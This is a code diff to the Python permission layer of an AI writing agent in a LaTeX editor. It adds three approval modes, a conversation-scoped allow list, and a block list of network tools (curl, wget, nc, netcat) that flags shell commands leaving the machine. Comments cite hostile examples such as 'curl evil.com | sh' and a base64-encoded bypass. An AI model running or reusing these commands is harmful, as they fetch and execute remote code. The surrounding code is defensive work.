@@ -37,6 +37,7 @@ import asyncio
 import json
 import logging
 import os
+import re
 import secrets
 import time
 from dataclasses import dataclass, field
@@ -44,6 +45,7 @@ from pathlib import Path
 from typing import Any, AsyncIterator, Callable
 
 from .claude_auth import claude_binary
+from .modes import DEFAULT_MODE, MODES
 from .project import is_control_path
 from .writing import PROSE
 
@@ -152,6 +154,56 @@ READING_TOOLS = frozenset({"Read", "NotebookRead", "Glob", "Grep"})
 # writing" was also answering a question about somebody else's.
 NETWORK_TOOLS = frozenset({"WebFetch", "WebSearch"})
 
+#: First words that take a shell command off this machine.
+#:
+#: A convenience, and emphatically not a fence.  `echo Y3VybAo= | base64 -d
+#: | sh` walks straight through it and so does any other command that
+#: assembles its own name, and no list of words can close that.  What it
+#: buys is that the middle position keeps its promise about the network in
+#: the ordinary case, because `curl evil.com | sh` is both a piped command
+#: the writer asked to run silently and a request that leaves the machine,
+#: and those two promises collide.  The complete fence is the first
+#: position; that is what it is for.
+NETWORK_COMMANDS = frozenset({
+    "curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat",
+    "telnet", "pip", "pip3", "npm", "npx", "yarn", "pnpm", "apt", "apt-get",
+    "brew", "gh", "hub",
+})
+#: `git` reaches the network for some of its verbs and not for others, and
+#: `git status` is most of what a build does.
+NETWORK_GIT_VERBS = frozenset({"push", "pull", "fetch", "clone", "remote", "submodule"})
+
+
+def reaches_the_network(command: str) -> str:
+    """The first segment of a shell command that leaves this machine, or "".
+
+    Split on the operators a shell treats as a boundary, because a command
+    is only as safe as its least safe segment: `latexmk && curl evil | sh`
+    starts with `latexmk`.
+    """
+    if not isinstance(command, str):
+        return ""
+    for segment in re.split(r"[;&|\n]+", command):
+        words = segment.strip().split()
+        if not words:
+            continue
+        # `VAR=1 curl ...` and `sudo curl ...` both hide the verb one word
+        # in, and there is no reason to be defeated by that.
+        for word in words:
+            if "=" in word.split("/")[-1] and not word.startswith("-"):
+                continue
+            if word in {"sudo", "env", "command", "nohup", "time"}:
+                continue
+            name = word.rsplit("/", 1)[-1]
+            if name in NETWORK_COMMANDS:
+                return name
+            if name == "git":
+                verbs = [w for w in words[words.index(word) + 1:] if not w.startswith("-")]
+                if verbs and verbs[0] in NETWORK_GIT_VERBS:
+                    return f"git {verbs[0]}"
+            break
+    return ""
+
 # What the model is told when it reaches for a subagent.
 #
 # Not a permission card, because a card is a question and this is not one.
@@ -174,12 +226,6 @@ _SUBAGENT_REFUSAL = (
 )
 
 
-def _auto_covers(tool_name: str, rule: str) -> bool:
-    if tool_name in ("Bash", "BashOutput", "KillShell"):
-        return bool(rule)
-    if tool_name in NETWORK_TOOLS:
-        return False
-    return True
 
 _HOW_TO_WORK = """\
 You are helping write and maintain a document in NextTex, a LaTeX editor.
@@ -340,6 +386,18 @@ class ProjectAgent:
         # not silent while one of these is running: it is waiting on work it
         # was told to do.
         self._running_tools: dict[str, tuple[str, float]] = {}
+        # Answers scoped to this conversation, keyed the same way the
+        # remembered ones are.  Deliberately not persisted and deliberately
+        # not in `_save_settings`: it dies with a new conversation because
+        # `reset()` empties it, and it dies with the process because there
+        # is nowhere for it to live.  That is the whole of "for this
+        # conversation" -- no file, no expiry, no cleanup path.
+        #
+        # It exists because the two things the middle position still asks
+        # about are things a turn asks about repeatedly: a run that fetches
+        # eleven DOIs put up eleven identical cards, and "always" was too
+        # much to agree to for one of them while "allow" was too little.
+        self._conversation_allow: set[str] = set()
         # Prefixes the user chose to always allow, e.g. "Bash:latexmk".
         # Persisted, because the README says the permission rules you have
         # set carry over and they did not: this lived in memory, so a
@@ -355,7 +413,7 @@ class ProjectAgent:
         # state directory is inside the project and ignores itself, and a
         # peer is refused it outright, so neither a clone nor a share can
         # carry a lowered fence onto another machine.
-        self.auto = self._load_auto()
+        self.mode = self._load_mode()
         # Edits made this turn, drained by the caller into the transcript.
         self._edits: list[EditRecord] = []
         self._file_snapshots: dict[str, str] = {}
@@ -408,8 +466,22 @@ class ProjectAgent:
             return {}
         return stored if isinstance(stored, dict) else {}
 
-    def _load_auto(self) -> bool:
-        return bool(self._stored_settings().get("auto", False))
+    def _load_mode(self) -> str:
+        """Which position the control is in, from disk.
+
+        A settings file written before there were three positions carries a
+        boolean, and it is read rather than discarded: an install that had
+        already turned auto mode on keeps the behaviour it had, which is the
+        middle position. It is deliberately *not* promoted to the third one,
+        because nobody agreed to that.
+        """
+        stored = self._stored_settings()
+        mode = stored.get("mode")
+        if isinstance(mode, str) and mode in MODES:
+            return mode
+        if "auto" in stored:
+            return "project" if stored.get("auto") else "ask"
+        return DEFAULT_MODE
 
     def _load_allow(self) -> set[str]:
         """The rules answered with "always" in an earlier session.
@@ -429,18 +501,36 @@ class ProjectAgent:
             self.state_dir.mkdir(parents=True, exist_ok=True)
             temp = self._auto_path.with_suffix(".json.tmp")
             temp.write_text(
-                json.dumps(
-                    {"auto": self.auto, "allow": sorted(self._always_allow)}
-                ),
+                json.dumps({
+                    "mode": self.mode,
+                    # Written as well as the mode, for one version, so a
+                    # tab or an install that has not been updated does not
+                    # read a fence it does not understand as no fence.
+                    "auto": self.mode != "ask",
+                    "allow": sorted(self._always_allow),
+                }),
                 encoding="utf-8",
             )
             temp.replace(self._auto_path)
         except OSError:
             pass
 
-    def set_auto(self, on: bool) -> None:
-        self.auto = bool(on)
+    def set_mode(self, mode: str) -> None:
+        """Move the control, refusing a position that does not exist.
+
+        Reachable from an HTTP body, so an unknown string is an error and
+        not a silent fall back to the quietest thing available.
+        """
+        if mode not in MODES:
+            raise ValueError(f"no such permission mode: {mode!r}")
+        self.mode = mode
         self._save_settings()
+
+    @property
+    def auto(self) -> bool:
+        """Whether this project asks at all, for anything that still reads
+        the old boolean."""
+        return self.mode != "ask"
 
     # -- permissions -------------------------------------------------------
     def _inside_project(self, raw: Any) -> bool:
@@ -571,20 +661,38 @@ class ProjectAgent:
                 return f"Bash!{command}"
         return ""
 
-    def _why_asked(self, tool_name: str, data: dict) -> str:
-        """Which rule put this card up, from the same facts the fence used.
+    def _holds_back(self, tool_name: str, data: dict) -> str:
+        """What, if anything, holds this call back at the middle position.
 
-        Worked out here rather than passed in from the fence, so that a card
-        cannot describe one rule while another one is the reason it exists.
-        That is what went wrong before: a write to a `latexmkrc` was
-        announced as a write outside the project, which was false twice
-        over, since the file is inside the project and the rule that fired
-        was the one about files the build executes.
+        One function answers both questions: whether to ask, and what the
+        card then says it is asking about. It used to answer only the
+        second, with `_auto_covers` answering the first, and the two could
+        disagree: a write to a `latexmkrc` was once announced as a write
+        outside the project, which was false twice over, since the file is
+        inside the project and the rule that fired was the one about files
+        the build executes. One predicate cannot disagree with itself.
+
+        The four answers are `outside`, `control`, `network` and `shell`,
+        and `shell` is only ever an answer at the first position, where a
+        compound command is asked about because no rule can honestly
+        describe it. At the middle position a compound command is the work,
+        and running the work is what that position is for.
+
+        **What the middle position does not promise.** A piped command or a
+        script can write outside the project and reach the network without
+        this function seeing either, because what it inspects is the tool
+        call and not what the command then does. So the middle position is a
+        quieter fence rather than a complete one, the complete one is the
+        first position, and `docs/design.md` s28 says so where a reader will
+        find it.
         """
-        if tool_name == "Bash":
-            return "shell" if shell_syntax_in(data.get("command") or "") else ""
         if tool_name in NETWORK_TOOLS:
             return "network"
+        if tool_name == "Bash":
+            command = data.get("command") or ""
+            if reaches_the_network(command):
+                return "network"
+            return "shell" if shell_syntax_in(command) else ""
         raw = data.get("file_path") or data.get("path") or data.get("notebook_path")
         if raw is None:
             return ""
@@ -594,16 +702,31 @@ class ProjectAgent:
             return "control"
         return ""
 
+    def _why_asked(self, tool_name: str, data: dict) -> str:
+        """Kept as the name `describe` reads, so a card and the fence agree."""
+        return self._holds_back(tool_name, data)
+
     def describe(self, tool_name: str, data: dict) -> dict:
         """Plain-English headline and detail for a permission card."""
         why = self._why_asked(tool_name, data)
         if tool_name == "Bash":
             command = data.get("command", "")
+            reason = self._reason(why, shell_syntax_in(command))
+            reaches = reaches_the_network(command)
+            if why == "network" and reaches and self.mode == "project":
+                # Naming the segment is worth more than the general
+                # sentence: the writer is looking at a long command and the
+                # question is which part of it stopped.
+                reason = (
+                    f"Asked at this setting: this runs {reaches}, which "
+                    "leaves the machine, and both the address and what is "
+                    "sent come from files that may not be yours."
+                )
             return {
                 "headline": "Run a shell command",
                 "detail": command,
                 "consequence": data.get("description", ""),
-                "reason": self._reason(why, shell_syntax_in(command)),
+                "reason": reason,
             }
         path = (
             data.get("file_path") or data.get("path") or data.get("notebook_path") or ""
@@ -658,34 +781,38 @@ class ProjectAgent:
         return {"headline": f"Use {tool_name}", "detail": json.dumps(data)[:400],
                 "consequence": "", "reason": self._reason(why, "")}
 
-    @staticmethod
-    def _reason(why: str, syntax: str) -> str:
+    def _reason(self, why: str, syntax: str) -> str:
         """One sentence saying which rule put this card up.
 
-        Empty when the switch is off, because then the answer is simply that
-        this app asks before it acts, and a sentence explaining that on every
-        card is a sentence people stop reading.
+        Empty at the first position, because there the answer is simply
+        that this app asks before it acts, and a sentence explaining that
+        on every card is a sentence people stop reading. It has something
+        to say at the middle position, where the writer has asked not to be
+        interrupted and is being interrupted anyway, which is the case that
+        otherwise reads as the control not working.
         """
+        if self.mode != "project":
+            return ""
         if why == "shell":
             said = syntax or "is more than the command it starts with"
             return (
-                f"Asked even with auto mode on: this command {said}, so a rule "
+                f"Asked at this setting: this command {said}, so a rule "
                 "scoped to its first word would not mean what it says."
             )
         if why == "control":
             return (
-                "Asked even with auto mode on, because approving the writing "
-                "is not approving the machinery that runs it."
+                "Asked at this setting, because approving the writing is not "
+                "approving the machinery that runs it."
             )
         if why == "outside":
             return (
-                "Asked even with auto mode on: this is the one action that "
-                "leaves the project the agent was pointed at."
+                "Asked at this setting: this is the one action that leaves "
+                "the project the agent was pointed at."
             )
         if why == "network":
             return (
-                "Asked even with auto mode on, because what is sent and where "
-                "it goes are chosen from files that may not be yours."
+                "Asked at this setting, because what is sent and where it "
+                "goes are chosen from files that may not be yours."
             )
         return ""
 
@@ -848,41 +975,63 @@ class ProjectAgent:
                 except OSError:
                     self._file_snapshots[str(path)] = ""
                 return self._allow("Inside the writing project.")
-            # Falls through to ask -- and this one is asked even in auto
-            # mode.  Everything inside the project is the writing, which is
-            # what the agent is for; a write outside it is the one action
-            # that leaves the thing the writer pointed it at, and a
-            # convenience switch is not consent for that.
+            # Falls through, and at the middle position this still asks.
+            # Everything inside the project is the writing, which is what
+            # the agent is for; a write outside it is the one action that
+            # leaves the thing the writer pointed it at, and a convenience
+            # position is not consent for that.  A control file inside the
+            # project arrives here too and for the same reason: `latexmkrc`
+            # is Perl, `.git/config` names a command that `git status`
+            # runs, and neither is the writing.
             #
-            # A control file inside the project arrives here too, and for
-            # the same reason: `latexmkrc` is Perl, `.git/config` names a
-            # command that `git status` runs, and neither is the writing.
+            # At the third position it does not ask, because that position
+            # asks about nothing and says so before it is switched on.
             #
-            # Which of the two it is has to travel with the request.  Both
-            # used to draw the same card, so a write to a `latexmkrc` was
+            # Which of the two it is travels with the request.  Both used
+            # to draw the same card, so a write to a `latexmkrc` was
             # announced as a write outside the project, and the writer was
             # asked to agree to something that was not happening.
-            decision = await self._ask_user(tool_name, tool_input)
-            if decision in {"allow", "always"}:
-                return self._allow()
-            result = self._deny("The user declined this action.")
-            if self._cancelled:
-                result["continue_"] = False
-                result["stopReason"] = "Interrupted."
-            return result
+            #
+            # And it is the same decision as every other call's, so it is
+            # made in the same place.  This used to be a second copy of the
+            # ask, which is how a new position gets added to one branch and
+            # not the other.
+            return await self._by_mode(tool_name, tool_input)
 
-        if self.auto:
-            # Read here, at the moment the call is made, so a switch flipped
-            # while a card is already on screen never answers it: the writer
-            # is looking at that card, and having it resolve itself under
-            # their cursor is what the click shield exists to prevent.
-            rule = self._rule_for(tool_name, tool_input)
-            if _auto_covers(tool_name, rule):
-                await self._settled(tool_name, tool_input, rule, "auto")
-                return self._allow("Approved automatically.")
+        return await self._by_mode(tool_name, tool_input)
+
+    async def _by_mode(self, tool_name: str, tool_input: dict) -> dict:
+        """Ask or allow, according to where the control is.
+
+        Read here, at the moment the call is made, so a control moved while
+        a card is already on screen never answers it: the writer is looking
+        at that card, and having it resolve itself under their cursor is
+        what the click shield exists to prevent.
+        """
+        held = self._holds_back(tool_name, tool_input)
+        # `all` is the position that asks about nothing, and it means it,
+        # including a write that leaves the project. Every action is still
+        # recorded, and at this position the record is the only account of
+        # what was done, so it matters more here rather than less.
+        if self.mode == "all":
+            await self._settled(
+                tool_name, tool_input,
+                self._rule_for(tool_name, tool_input), "auto",
+            )
+            return self._allow("Approved automatically.")
+        # `project` runs the work silently. A compound command is the work,
+        # which is the change that removes most of the cards; what still
+        # asks is what this function can see leaving the writing or leaving
+        # the machine.
+        if self.mode == "project" and held not in {"outside", "control", "network"}:
+            await self._settled(
+                tool_name, tool_input,
+                self._rule_for(tool_name, tool_input), "auto",
+            )
+            return self._allow("Approved automatically.")
 
         decision = await self._ask_user(tool_name, tool_input)
-        if decision in {"allow", "always"}:
+        if decision in {"allow", "always", "conversation"}:
             return self._allow()
         result = self._deny("The user declined this action.")
         if self._cancelled:
@@ -908,10 +1057,22 @@ class ProjectAgent:
             **self.describe(tool_name, tool_input),
         })
 
-    async def _ask_user_would_return(self, tool_name: str, tool_input: dict) -> bool:
-        """Whether a remembered answer already covers this call, without asking."""
+    def already_answered(self, tool_name: str, tool_input: dict) -> str:
+        """Which remembered answer covers this call, or "".
+
+        Was `_ask_user_would_return`, which production never called and only
+        a test did. A function that exists for its own test is free to drift
+        from the fence it claims to describe, so this one is the thing
+        `_ask_user` actually consults, and the test asserts on that.
+        """
         rule = self._memo_for(tool_name, tool_input)
-        return bool(rule) and rule in self._always_allow
+        if not rule:
+            return ""
+        if rule in self._always_allow:
+            return "always"
+        if rule in self._conversation_allow:
+            return "conversation"
+        return ""
 
     async def _ask_user(self, tool_name: str, tool_input: dict) -> str:
         """Put a permission card in front of the user and wait for the answer."""
@@ -921,6 +1082,9 @@ class ProjectAgent:
             # still an action taken on their document, and the transcript is
             # the account of what was done to it.
             await self._settled(tool_name, tool_input, rule, "always")
+            return "allow"
+        if rule and rule in self._conversation_allow:
+            await self._settled(tool_name, tool_input, rule, "conversation")
             return "allow"
 
         # Two tool calls can land in the same millisecond, and the second
@@ -965,6 +1129,13 @@ class ProjectAgent:
             self._pending.pop(request_id, None)
             self._pending_cards.pop(request_id, None)
 
+        if decision == "conversation":
+            # Nothing is written to disk.  An empty key means there was
+            # nothing nameable to scope to, so the answer stands for this
+            # call and the next one asks again, which is the same rule
+            # "always" follows.
+            if rule:
+                self._conversation_allow.add(rule)
         if decision == "always":
             # An empty key means there was nothing nameable to remember: a
             # path tool whose argument is not a path at all.  Honour the
@@ -2104,6 +2275,9 @@ class ProjectAgent:
             raise RuntimeError("a turn is still running")
         self._session_id = None
         self._session_path.unlink(missing_ok=True)
+        # The point of "for this conversation" is that this is where it
+        # ends.  The remembered rules stay, for the reason given above.
+        self._conversation_allow.clear()
         self._file_snapshots.clear()
         self._edits.clear()
         self._why = ""
